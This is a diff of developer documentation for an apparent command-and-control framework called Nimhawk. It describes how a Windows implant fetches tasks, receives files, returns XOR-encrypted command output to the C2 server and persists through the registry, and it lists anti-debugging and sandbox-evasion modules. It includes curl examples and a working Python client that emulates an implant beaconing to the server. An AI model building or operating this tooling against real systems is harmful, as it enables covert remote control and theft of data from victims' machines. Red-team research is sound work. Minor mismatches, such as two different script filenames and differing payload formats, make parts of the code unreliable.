+Explained Flow:
+In this process both servers are involved:
+ - Admin Server (admin_server_init.py): Handles Operator Dashboard communication
+ - Implant Server (implants_server_init.py): Handles implants encrypted communication
+ - Both interact with Database
+ - You can read more about this in:
+      - src/servers/admin_api/admin_server_init.py
+      - src/servers/implants_api/implants_server_init.py
+      - src/config/db.py
+
+1.  When an upload command is queued through the Operator Dashboard, the following process takes place:
+
+  - The **Admin Server** receive the file and generates a unique MD5 HASH ID to identify it
+  - The server stores the file information in the database with:
+    - File ID (md5 hash)
+    - Original filename
+    - Full file path
+
+3. The Implant receives the `upload` command with the file FILE HASH ID vía Implant Server `/task` polling
+4. The Implant requests the file from the **Implant Server** using the FILE HASH ID `/task/<file_hash_id>`
+5. The **Implant Server**:
+   - Verifies the file exists in the database (using db.py)
+   - Reads the file content
+   - Compresses the content using zlib
+   - Encrypts the compressed data using UNIQUE_XOR_KEY
+   - Base64 encodes the encrypted data
+   - Sends the data with headers:
+     - `Content-Type: application/x-gzip`
+     - `X-Original-Filename: <base64_encrypted_filename>` (filename is encrypted using UNIQUE_XOR_KEY)
+7. The Implant: (in upload.nim)
+   - Receives the base64 encoded data
+   - Decodes from base64
+   - Decrypts using UNIQUE_XOR_KEY
+   - Decompresses using zlib
+   - Receives the decode and decrypt filename from X-Original-Filename header
+   - Decrypts the filename using its UNIQUE_XOR_KEY
+   - Saves the file with the decrypted original filename (filename can includes a path + filename)
+
+**Security Note**: The filename is encrypted using the UNIQUE_XOR_KEY and base64 encoded as the file content, ensuring that both the file content and its name are protected during transmission. This add a OPSEC to the process (Not a big thing but it's better than send raw filename).
+
+**Example CURL**:
+```bash
+# Get pending tasks
+curl -X GET "http://server:port/task" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
+  -H "X-Correlation-ID: PASIOnodnoqonasond12314" \
+  -H "X-Request-ID: <guid>" 
+  
+# Download file
+curl -X GET "http://server:port/task/<file_hash_id>" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
+  -H "X-Correlation-ID: PASIOnodnoqonasond12314" \
+  -H "X-Request-ID: <guid>" \
+  -H "Content-MD5: <task_guid>"
+```
+---------------------------------------------------------------------------------------------
+
+
+## Command Submission Flow (How an Implant sends commands output to C2 Server) - Implant Server
+
+### 1. Result Endpoint (`/result`)
+
+**Purpose**: Submits command execution results to Implant Server.
+
+**Methods**: 
+- POST: Submit command output
+
+**Headers Required**:
+
+| Header | Value | Description |
+|--------|-------|-------------|
+| X-Request-ID | `<implant_guid>` | Unique identifier for the implant |
+| User-Agent | `<user_agent>` | Configured user agent |
+| X-Correlation-ID |	`<http_allow_key>` |	Authentication key for machine-to-machine
+| Content-Type | application/json | Request content type |
+
+**Result Processing Flow**:
+```
++----------------+     +----------------+     +----------------+
+|    Implant     |     |    Server      |     |   Database     |
++----------------+     +----------------+     +----------------+
+        |                     |                      |
+        |-- POST /result ---->|                      |
+        |                     |-- Store result ----->|
+        |                     |                      |
+        |<-- 200 OK ----------|                      |
+        |                     |                      |
++----------------+     +----------------+     +----------------+
+```
+
+Explained Flow:
+1. Implant executes command and encrypts result (refer to `core/cmdParser.nim`)
+2. Implant sends encrypted result to server
+3. Server stores result in the database
+4. Server confirms successful reception
+
+**Process Flow**:
+1. Implant receive a vía `/task` endpoint (refer to `/task` endpoint documentation above)
+2. Implant executes the command
+2. Results are encrypted using UNIQUE_XOR_KEY with the implant's key memory.
+3. Encrypted data is base64 encoded
+4. POST request is sent to `/result` endpoint
+5. Server:
+   - Validates headers and authentication
+   - Decrypts the data using the Unique XOR Key
+   - Stores the result in the database
+   - Updates command status to "completed"
+   - Returns 200 on success
+
+**Example CURL**:
+```bash
+curl -X POST "http://server:port/result" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
+  -H "X-Correlation-ID: PASIOnodnoqonasond12314" \
+  -H "X-Request-ID: <guid>" \
+  -H "Content-Type: application/json" \
+  -d '{"data": "<base64_encoded_xor_encrypted_result>"}'
+```
+
+**Security Considerations**:
+- All results are encrypted using the implant's unique XOR key
+- Base64 encoding prevents null bytes from breaking HTTP communication
+- Headers are validated to ensure proper authentication
+- Results are stored securely in the database
+- Command status is updated to prevent duplicate submissions
+
+**Error Handling**:
+- Invalid headers return 400 Bad Request
+- Authentication failure returns 401 Unauthorized
+- Invalid GUID returns 404 Not Found
+- Server errors return 500 Internal Server Error
+---------------------------------------------------------------------------------------------
+
+## Implant Reconnection Flow (How an Implant exchange UNIQUE_XOR_KEY with C2 if process restart or a system reboots happens) - Implant Server
+
+### 1. Reconnect Endpoint (`/reconnect`)
+
+**Purpose**: Handles reconnection of existing implants and provides communication persistence mechanism.
+
+**Methods**: 
+- OPTIONS: Reconnection request
+
+**Headers Required**:
+
+| Header | Value | Description |
+|--------|-------|-------------|
+| X-Request-ID | `<decrypted_guid>` | Decrypted implant GUID |
+| User-Agent | `<user_agent>` | Configured user agent |
+| X-Correlation-ID | `<http_allow_key>` | HTTP authentication key |
+
+**Reconnection Flow**:
+
+Communication Diagram:
+```
++----------------+     +----------------+     +----------------+
+|    Implant     |     |Implant Server |     |    SQLite      |
+|   (Windows)    |     |   (HTTP/S)    |     |   Database     |
++----------------+     +----------------+     +----------------+
+        |                     |                     |
+        | Read Registry and   |                     |
+        | get Encrypted ID    |                     |
+        |                     |                     |
+        | Decrypt ID using    |                     |
+        | INITIAL_XOR_KEY     |                     |
+        |                     |                     |
+        | OPTIONS /reconnect  |                     |
+        | Headers:            |                     |
+        | - X-Request-ID      |                     |
+        |   (Decrypted ID)    |                     |
+        | - X-Correlation-ID  |                     |
+        |   (HTTP Auth Key)   |                     |
+        | - User-Agent        |                     |
+        |-------------------->|                     |
+        |                     |                     |
+        |                     | Query Implant Info  |
+        |                     |-------------------->|
+        |                     |                     |
+        |                     | Return              |
+        |                     | UNIQUE_XOR_KEY      |
+        |                     |<--------------------|
+        |                     |                     |
+        | Response:           |                     |
+        | Status 200 + Key or |                     |
+        | Status 410 (Gone)   |                     |
+        |<--------------------|                     |
+        |                     |                     |
+        | If 200:             |                     |
+        | 1. Decode base64    |                     |
+        | 2. XOR decrypt      |                     |
+        | 3. Store:           |                     |
+        |   UNIQUE_XOR_KEY    |                     |
+        |   in Implant memory |                     |                
+        |                     |                     |
+        | If 410:             |                     |
+        | 1. Clear registry   |                     |
+        | 2. Re-register      |                     |
+        |                     |                     |
++----------------+     +----------------+     +----------------+        
+```
+
+**Persistence Mechanism**:
+1. **Registry Storage**:
+   - Implant encrypted ID is stored in Windows registry during initial registration
+   - Acts as a mutex to prevent multiple implants running in same machine
+   - Ensure encrypted communication after system reboots and process restarts
+
+2. **XOR Key Recovery Scenario**:
+   - Implant UNIQUE_XOR_KEY generated after implant registration is stored in memory, so if implant die, key will lost after process termination or system reboot
+   - Reconnect endpoint provides new XOR key to restart secure communication between server and implant.
+
+3. **Reconnection Process**:
+   - Implant reads encrypted ID from registry
+   - Decrypts the ID for use in communication
+   - Sends OPTIONS request with decrypted ID in X-Request-ID header
+   - Server validates ID and returns new XOR key
+   - Implant updates encryption key in memory
+   - Communication resumes with new secure key
+
+**Example CURL**:
+```bash
+curl -X OPTIONS "http://server:port/reconnect" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
+  -H "X-Correlation-ID: PASIOnodnoqonasond12314"
+  -H "X-Request-ID: <decrypted_implant_id>" \
+```
+
+
+
+**Security Considerations**:
+- Registry storage provides persistence without file system artifacts
+- ID is encrypted in registry but sent decrypted in X-Request-ID header
+- XOR key rotation on reconnection enhances security
+- Authentication required for reconnection requests
+- Prevents unauthorized implants from reconnecting
+- Maintains secure communication after system reboots
+
+**Error Handling**:
+- Invalid ID returns 404 Not Found
+- Authentication failure returns 401 Unauthorized
+- Inactive implant returns 410 Gone
+- Server errors return 500 Internal Server Error
+
+**Use Cases**:
+1. System Reboot:
+   - Implant restarts and reads encrypted ID from registry
+   - Decrypts ID and requests new XOR key via reconnect
+   - Resumes secure communication
+
+2. Process Restart:
+   - Implant process terminates and restarts
+   - Encrypted registry ID prevents duplicate instances
+   - New XOR key obtained for continued operation
+
+---------------------------------------------------------------------------------------------
+
+
+## Test Script
+
+Below is a Python script to test all endpoints. Save it in `dev_utils/test_implant_api.py`:
+
+```python
+import base64
+import sys
+import os
+import json
+import requests
+import zlib
+from pathlib import Path
+from typing import Dict, Any, Optional
+
+class ImplantAPITester:
+    def __init__(self, base_url: str, workspace_uuid: Optional[str] = None):
+        self.base_url = base_url.rstrip('/')
+        self.headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko',
+            'X-Correlation-ID': 'PASIOnodnoqonasond12314',
+            'Content-Type': 'application/json'
+        }
+        if workspace_uuid:
+            self.headers['X-Robots-Tag'] = workspace_uuid
+            
+        self.implant_id = None
+        self.unique_xor_key = None
+        self.initial_xor_key = None
+        
+        # Read INITIAL_XOR_KEY from .xorkey file
+        try:
+            with open('.xorkey', 'r') as f:
+                self.initial_xor_key = int(f.read().strip())
+        except FileNotFoundError:
+            print("Error: .xorkey file not found")
+            sys.exit(1)
+        except ValueError:
+            print("Error: Key in .xorkey must be an integer")
+            sys.exit(1)
+
+    def xor_encrypt(self, data: str, key: int) -> str:
+        """XOR encrypt data with key and return base64"""
+        encrypted = ''.join(chr(ord(c) ^ key) for c in data)
+        return base64.b64encode(encrypted.encode()).decode()
+
+    def xor_decrypt(self, data: str, key: int) -> str:
+        """Decode base64 and XOR decrypt data"""
+        decoded = base64.b64decode(data.encode()).decode()
+        return ''.join(chr(ord(c) ^ key) for c in decoded)
+
+    def register(self) -> Dict[str, Any]:
+        """Initial registration request using INITIAL_XOR_KEY"""
+        print("\nRegistering new implant...")
+        response = requests.get(
+            f"{self.base_url}/register",
+            headers=self.headers
+        )
+        
+        if response.status_code == 200:
+            data = response.json()
+            self.implant_id = data['id']
+            self.unique_xor_key = int(base64.b64decode(data['k']).decode())
+            self.headers['X-Request-ID'] = self.implant_id
+            print(f"Got implant ID: {self.implant_id}")
+            print(f"Got UNIQUE_XOR_KEY: {self.unique_xor_key}")
+            
+        return response.json()
+
+    def activate(self, system_info: Dict[str, Any]) -> Dict[str, Any]:
+        """Activate implant with system information using UNIQUE_XOR_KEY"""
+        if not self.unique_xor_key:
+            raise Exception("Must register first to get UNIQUE_XOR_KEY")
+            
+        encrypted_data = self.xor_encrypt(json.dumps(system_info), self.unique_xor_key)
+        
+        print("\nActivating implant...")
+        response = requests.post(
+            f"{self.base_url}/register",
+            headers=self.headers,
+            json={'data': encrypted_data}
+        )
+        
+        return response.json()
+
+    def get_task(self) -> Dict[str, Any]:
+        """Get pending tasks using UNIQUE_XOR_KEY"""
+        if not self.unique_xor_key:
+            raise Exception("Must register first to get UNIQUE_XOR_KEY")
+            
+        print("\nChecking for tasks...")
+        response = requests.get(
+            f"{self.base_url}/task",
+            headers=self.headers
+        )
+        
+        if response.status_code == 200:
+            encrypted_data = response.json().get('data')
+            if encrypted_data:
+                decrypted = self.xor_decrypt(encrypted_data, self.unique_xor_key)
+                return json.loads(decrypted)
+        return response.json()
+
+    def download_file(self, file_id: str, task_guid: str) -> bytes:
+        """Download and process file from server"""
+        if not self.unique_xor_key:
+            raise Exception("Must register first to get UNIQUE_XOR_KEY")
+            
+        headers = self.headers.copy()
+        headers['Content-MD5'] = task_guid
+        
+        print(f"\nDownloading file {file_id}...")
+        response = requests.get(
+            f"{self.base_url}/task/{file_id}",
+            headers=headers
+        )
+        
+        if response.status_code == 200:
+            # Get encrypted filename from header
+            enc_filename = response.headers.get('X-Original-Filename')
+            if enc_filename:
+                filename = self.xor_decrypt(enc_filename, self.unique_xor_key)
+                print(f"Original filename: {filename}")
+            
+            # Process file content
+            content = base64.b64decode(response.content)
+            decrypted = self.xor_decrypt(content.decode(), self.unique_xor_key)
+            decompressed = zlib.decompress(decrypted.encode())
+            return decompressed
+        
+        return response.content
+
+    def submit_result(self, task_guid: str, result: str) -> Dict[str, Any]:
+        """Submit command execution result using UNIQUE_XOR_KEY"""
+        if not self.unique_xor_key:
+            raise Exception("Must register first to get UNIQUE_XOR_KEY")
+            
+        data = {
+            'guid': task_guid,
+            'result': base64.b64encode(result.encode()).decode()
+        }
+        encrypted_data = self.xor_encrypt(json.dumps(data), self.unique_xor_key)
+        
+        print("\nSubmitting result...")
+        response = requests.post(
+            f"{self.base_url}/result",
+            headers=self.headers,
+            json={'data': encrypted_data}
+        )
+        return response.json()
+
+    def reconnect(self) -> Dict[str, Any]:
+        """Test reconnection flow using INITIAL_XOR_KEY for registry ID"""
+        if not self.implant_id:
+            raise Exception("Must register first to get implant ID")
+            
+        # Simulate reading encrypted ID from registry
+        enc_id = self.xor_encrypt(self.implant_id, self.initial_xor_key)
+        # Decrypt ID for X-Request-ID header
+        dec_id = self.xor_decrypt(enc_id, self.initial_xor_key)
+        
+        headers = self.headers.copy()
+        headers['X-Request-ID'] = dec_id
+        
+        print("\nTesting reconnection...")
+        response = requests.options(
+            f"{self.base_url}/reconnect",
+            headers=headers
+        )
+        
+        if response.status_code == 200:
+            # Update UNIQUE_XOR_KEY
+            data = response.json()
+            new_key = base64.b64decode(data['k']).decode()
+            self.unique_xor_key = int(new_key)
+            print(f"Got new UNIQUE_XOR_KEY: {self.unique_xor_key}")
+        elif response.status_code == 410:
+            print("Implant marked as inactive")
+        
+        return response.json()
+
+def main():
+    if len(sys.argv) < 3:
+        print("Usage: python test_implant_routes.py <endpoint> <server_url> [workspace_uuid]")
+        print("\nAvailable endpoints:")
+        print("  register")
+        print("  task")
+        print("  download <file_id> <task_guid>")
+        print("  result <task_guid> <result>")
+        print("  reconnect")
+        sys.exit(1)
+
+    endpoint = sys.argv[1]
+    server_url = sys.argv[2]
+    workspace_uuid = sys.argv[3] if len(sys.argv) > 3 else None
+    
+    tester = ImplantAPITester(server_url, workspace_uuid)
+
+    if endpoint == "register":
+        # Test full registration flow
+        tester.register()
+        system_info = {
+            "i": "192.168.1.100",
+            "u": "testuser",
+            "h": "TEST-PC",
+            "o": "Windows 10",
+            "p": 1234,
+            "P": "test.exe",
+            "r": True
+        }
+        tester.activate(system_info)
+    
+    elif endpoint == "task":
+        tester.register()  # Need to register first
+        tester.get_task()
+    
+    elif endpoint == "download":
+        if len(sys.argv) < 5:
+            print("Error: download requires <file_id> and <task_guid>")
+            sys.exit(1)
+        tester.register()  # Need to register first
+        content = tester.download_file(sys.argv[3], sys.argv[4])
+        print(f"Downloaded content length: {len(content)} bytes")
+    
+    elif endpoint == "result":
+        if len(sys.argv) < 5:
+            print("Error: result requires <task_guid> and <result>")
+            sys.exit(1)
+        tester.register()  # Need to register first
+        tester.submit_result(sys.argv[3], sys.argv[4])
+    
+    elif endpoint == "reconnect":
+        tester.register()  # Need to register first
+        tester.reconnect()
+    
+    else:
+        print(f"Error: Unknown endpoint: {endpoint}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+```
+
+To use the test script:
+
+1. Save it as `test_implant_api.py`
+2. Create a `.xorkey` file with the XOR key (or it will use the default)
+3. Run with: `python test_implant_routes.py`
+
+The script provides a complete test suite for all implant API endpoints and can be used as a reference for implementing new features or modifying existing ones.
+
+## Pull request process
 
 1. Ensure your code works locally
 2. Run tests to verify you're not introducing regressions
@@ -530,765 +1385,175 @@ When the frontend connects with the backend after logging in, the first action i
 4. Submit a PR with a clear description of the purpose
 5. Respond to review comments
 
-## Feature documentation
+## Implant Core Components
 
-### 1. Enhanced reconnection system
+### 1. Main Entry Point (NimPlant.nim)
 
-The reconnection system has been significantly improved:
+The main entry point for the implant is `NimPlant.nim`, which handles:
+- Initialization of core components
+- Registry persistence
+- Communication setup
+- Command execution loop
 
-- **Registry Cleanup**: Implants now automatically remove previous registry entries before registering a new implant ID
-- **Prevention of Orphaned Entries**: The cleanup process ensures that no registry artifacts remain after implant termination
-- **Error Handling**: Improved error handling for registry operations, with proper logging
-- **Status Code Handling**: Added support for handling specific status codes (like 410) to properly manage inactive implants
-- **Cleaner Reconnection Flow**: Streamlined the reconnection process with better state management
-- **Technical Implementation**: Added `removeImplantIDFromRegistry` function to properly clean up registry entries
+### 2. Package Configuration (implant.nimble)
 
-#### Implementation Details
+The `implant.nimble` file defines:
+- Package dependencies
+- Compilation flags
+- Build configuration
+- Cross-compilation settings
 
-The reconnection flow has been reimplemented as follows:
+### 3. Compiler Configuration (nim.cfg)
 
-1. Before attempting reconnection, the implant retrieves its stored ID from the registry
-2. The implant then attempts to reconnect using an OPTIONS request to the `reconnectPath` endpoint
-3. The server validates the implant ID and responds with appropriate status codes:
-   - 200: Successful reconnection, new encryption key is provided
-   - 410: Implant is marked as inactive on the server
-   - 404: Implant ID is no longer recognized
-4. Based on the response code, the implant decides how to proceed:
-   - For 200: Update encryption key and continue operation
-   - For 410/404: Remove the old implant ID from registry using `removeImplantIDFromRegistry()` and request a new ID
-5. If reconnection fails, the registry entry is properly cleaned up before requesting a new implant ID
+The `nim.cfg` file contains:
+- Cross-compilation settings for Windows
+- Optimization flags
+- Debug settings
+- Path configurations
 
-Key code improvements in `webClientListener.nim`:
+### 4. Core Modules
 
-```nim
-proc removeImplantIDFromRegistry() =
-  # Clean up registry entry before requesting a new ID
-  try:
-    let key = openKey(HKEY_CURRENT_USER, regPath, samWrite)
-    key.deleteValue(regId)
-    close(key)
-    echo "DEBUG: Successfully removed implant ID from registry"
-  except:
-    echo "DEBUG: Error removing implant ID from registry"
+#### Self Protection (selfProtections/)
+- Anti-debugging mechanisms
+- Process injection detection
+- Sandbox evasion
+- Memory protection
+
+#### Utility Modules (util/)
+- Encryption utilities
+- Network operations
+- File system operations
+- System information gathering
+
+#### Core Functionality (core/)
+- Command parsing
+- Task execution
+- Result handling
+- Communication protocols
+
+#### Configuration (config/)
+- Parameter parsing
+- Environment setup
+- Runtime configuration
+- Security settings
+
+## Server Architecture
+
+### 1. Main Server (main.py)
+
+The main server entry point handles:
+- Server initialization
+- Configuration loading
+- Component startup
+- Error handling
+
+### 2. Admin Web Interface (admin_web_ui/)
+
+The web interface includes:
+- React/Next.js components
+- Mantine UI framework
+- Authentication system
+- Real-time updates
+
+### 3. Server Components (src/)
+
+#### Admin API (src/servers/admin_api/)
+- User management
+- Command queuing
+- File handling
+- Session management
+
+#### Implant API (src/servers/implants_api/)
+- Implant registration
+- Task delivery
+- Result processing
+- Reconnection handling
+
+### 4. File Management
+
+#### Uploads (uploads/)
+- Temporary storage for files
+- File validation
+- Security checks
+- Cleanup procedures
+
+#### Downloads (downloads/)
+- Implant file storage
+- Access control
+- File organization
+- Retention policies
+
+#### Logs (logs/)
+- Server logging
+- Implant activity
+- Error tracking
+- Audit trails
+
+## Database Management
+
+### 1. Database Schema (nimhawk.db)
+
+The SQLite database stores:
+- Implant information
+- User accounts
+- Command history
+- File hash correlation and metadata
+
+## A Note on Learning
+
+```bash
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⠤⠐⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡌⡦⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣼⡊⢀⠔⠀⠀⣄⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⣀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⠃⠉⠡⡠⠤⠊⠀⠠⣀⣀⡠⠔⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⢟⠿⠛⠛⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇⠀⠀⠀⠀⠑⠶⠖⠊⠁⠀⠀⠀⡀⠀⠀⠀⢀⣠⣤⣤⡀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⠟⡱⠁⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣾⣿⡇⠀⢀⡠⠀⠀⠀⠈⠑⢦⣄⣀⣀⣽⣦⣤⣾⣿⠿⠿⠿⣿⡆⠀⠀⢀⠺⣿⣿⣿⣿⡿⠁⡰⠁⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣧⣠⠊⣠⣶⣾⣿⣿⣶⣶⣿⣿⠿⠛⢿⣿⣫⢕⡠⢥⣈⠀⠙⠀⠰⣷⣿⣿⣿⡿⠋⢀⠜⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢿⣿⣿⣿⣿⣰⣿⣿⠿⣛⡛⢛⣿⣿⣟⢅⠀⠀⢿⣿⠕⢺⣿⡇⠩⠓⠂⢀⠛⠛⠋⢁⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠘⢶⡶⢶⣶⣦⣤⣤⣤⣤⣤⣀⣀⣀⣀⡀⠀⠘⣿⣿⣿⠟⠁⡡⣒⣬⢭⢠⠝⢿⡡⠂⠀⠈⠻⣯⣖⣒⣺⡭⠂⢀⠈⣶⣶⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠙⠳⣌⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣵⣨⣿⣿⡏⢀⠪⠎⠙⠿⣋⠴⡃⢸⣷⣤⣶⡾⠋⠈⠻⣶⣶⣶⣷⣶⣷⣿⣟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠛⢦⣌⡙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠩⠭⡭⠴⠊⢀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⡇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠦⣄⡉⠛⠛⠻⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⢀⣰⠋⠀⠀⠀⠀⠀⣀⣰⠤⣳⣿⣿⣿⣿⣟⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠒⠒⠶⢺⣿⣿⣿⣿⣦⣄⣀⣴⣿⣯⣤⣔⠒⠚⣒⣉⣉⣴⣾⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣉⣉⣤⣿⣿⣿⣿⣿⣿⡿⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⡁⡆⠙⢶⣀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣴⣶⣾⣿⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢛⣩⣴⣿⠇⡇⠸⡆⠙⢷⣄⠻⣿⣦⡄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣎⢻⣿⣿⣿⣿⣿⣿⣿⣭⣭⣭⣵⣶⣾⣿⣿⣿⠟⢰⢣⠀⠈⠀⠀⠙⢷⡎⠙⣿⣦⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⡆⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠋⠁⢀⠇⢸⡇⠀⠀⠀⠀⠈⠁⠀⢸⣿⡆⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⡿⡘⣿⣿⣿⣿⣿⣶⣶⣤⣤⣤⣤⣤⣤⣤⣴⡎⠖⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⡄⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠋⡟⠀⠀⣸⣷⣀⣤⣀⣀⣀⣤⣤⣾⣿⣿⣿⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣓⡲⠬⢭⣙⡛⠿⣿⣿⣶⣦⣀⠀⡜⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣛⣓⠶⠦⠥⣀⠙⠋⠉⠉⠻⣄⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣆⠐⣦⣠⣷⠊⠁⠀⠀⡭⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢉⣛⡛⢻⡗⠂⠀⢀⣷⣄⠈⢆⠉⠙⠻⢿⣿⣿⣿⣿⣿⠇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣉⢁⣴⣿⣿⣿⣾⡇⢀⣀⣼⡿⣿⣷⡌⢻⣦⡀⠀⠈⠙⠛⠿⠏⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⢯⡉⠉⠉⠉⠉⠛⢼⣿⠿⠿⠦⡙⣿⡆⢹⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠄⠈⠻⠿⠿⠿⠿⠿⠿⠛⠛⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠻⠿⠿⠿⠿⠟⠉⠀⠀⠤⠴⠶⠌⠿⠘⠿⠿⠿⠿⠶⠤⠀⠀⠀⠀
+
+           Guide you, no longer I can. Yours, the path now is!
+           Code, you must contribute, little padawan.             
 ```
 
-The reconnection system now properly handles various failure scenarios, including network interruptions, server-side implant deregistration, and error conditions, ensuring a more robust and reliable operation.
+This documentation provides the foundations needed to get started with Nimhawk, but intentionally leaves room for discovery. Like a well-crafted game, it gives you the basic tutorial while letting you discover advanced mechanics on your own.
 
-### 2. Multi-status implant support
+Why? Because:
+- The best learning comes from exploration
+- Understanding comes from reading code
+- Discovery makes the journey more rewarding
+- Security tools require deep comprehension
 
-A visual tracking system has been implemented that provides clear status indicators:
+So dive in, explore the code, and find your own path. The real magic of Nimhawk lies in the journey of discovery.
 
-- **Active Implants**: Displayed in green, indicating recently checked-in implants
-- **Late Implants**: Displayed in orange, for implants that have missed recent check-ins but are still considered active
-- **Disconnected Implants**: Displayed in red, for implants that have not checked in for more than 5 minutes
